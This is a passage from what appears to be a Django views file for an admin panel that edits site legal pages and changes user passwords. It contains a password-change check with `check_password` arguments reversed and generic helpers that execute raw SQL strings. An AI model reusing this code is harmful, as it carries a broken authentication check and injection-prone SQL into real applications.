    review_info.isdisplay = value
    review_info.save()
    return JsonResponse({'result':'success'})
def termsOfService(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        if request.POST["id"] != "":
            instance = TblHeadercontent.objects.get(id=request.POST["id"])
            instance.termsofservice = request.POST["termsofservice"]
            instance.save()
            # form = HeaderContentForm(request.POST, instance=instance)
        else:
            form = HeaderContentForm(request.POST)
            if form.is_valid():
                form.save()
            else:
                print(form.errors)
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    if len(header_content) > 0:
        return render(request, "admin/termsOfService.html",{"header_content":header_content[0],"url":"termsOfService","category_list":category_list})
    else:
        return render(request, "admin/termsOfService.html",{"url":"termsOfService"})
def adminPrivacypolicy(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        if request.POST["id"] != "":
            instance = TblHeadercontent.objects.get(id=request.POST["id"])
            instance.privacypolicy = request.POST["privacypolicy"]
            instance.save()
            # form = HeaderContentForm(request.POST, instance=instance)
        else:
            form = HeaderContentForm(request.POST)
            if form.is_valid():
                form.save()
            else:
                print(form.errors)
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    if len(header_content) > 0:
        return render(request, "admin/adminPrivacypolicy.html",{"header_content":header_content[0],"url":"privacypolicy","category_list":category_list})
    else:
        return render(request, "admin/adminPrivacypolicy.html",{"url":"privacypolicy"})
def adminImprint(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        if request.POST["id"] != "":
            instance = TblHeadercontent.objects.get(id=request.POST["id"])
            instance.imprint = request.POST["imprint"]
            instance.save()
            # form = HeaderContentForm(request.POST, instance=instance)
        else:
            form = HeaderContentForm(request.POST)
            if form.is_valid():
                form.save()
            else:
                print(form.errors)
    header_content = TblHeadercontent.objects.all()
    if len(header_content) > 0:
        return render(request, "admin/adminImprint.html",{"header_content":header_content[0],"url":"imprint"})
    else:
        return render(request, "admin/adminImprint.html",{"url":"imprint"})
def userChangePassword(request):
    if "user_id" not in request.session:
        return redirect('/Login')
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    content = {"header_content":header_content[0],"category_list":category_list}
    if request.method == "POST":
        current_user = Aspnetusers.objects.get(id=request.session['user_id'])
        if check_password(current_user.passwordhash, request.POST['old_password']):
            current_user.passwordhash = make_password(request.POST['password'])
            current_user.save()
            content['error'] = "no"
            return render(request,"userChangePassword.html",content)
        else:
            content['error'] = "exist"
            return render(request,"userChangePassword.html",content)
    return render(request,"userChangePassword.html",content)
def adminChangePassword(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == "POST":
        current_user = Aspnetusers.objects.get(id=request.session['user_id'])
        if check_password(current_user.passwordhash, request.POST['old_password']):
            current_user.passwordhash = make_password(request.POST['password'])
            current_user.save()
            return render(request,"admin/adminChangePassword.html",{"url":"adminChangePassword","error":"no"})
        else:
            return render(request,"admin/adminChangePassword.html",{"url":"adminChangePassword","error":"exist"})
    return render(request,"admin/adminChangePassword.html",{"url":"adminChangePassword"})
def get_list_from_sql(str):
    cursor = connection.cursor()    
    cursor.execute(str)
    row = dictfetchall(cursor)
    return row
def execute_sql(str):
    cursor = connection.cursor()    
    cursor.execute(str)
def dictfetchall(cursor):
    columns = [col[0] for col in cursor.description]
    return [
        dict(zip(columns, row))
        for row in cursor.fetchall()
    ]